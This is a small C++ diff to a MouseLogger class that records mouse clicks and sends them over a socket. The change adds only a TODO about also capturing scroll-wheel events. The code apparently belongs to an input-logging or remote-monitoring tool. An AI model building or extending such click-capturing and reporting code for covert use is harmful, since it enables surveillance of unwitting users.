@@ -25,6 +25,8 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 			msg = "<right-click>";
 		}
 
+		// TODO: check scroll wheel up, scroll wheel down & scroll wheel click
+
 		std::cout << msg;
 		send(sock, msg.c_str(), msg.length(), 0);
 	}
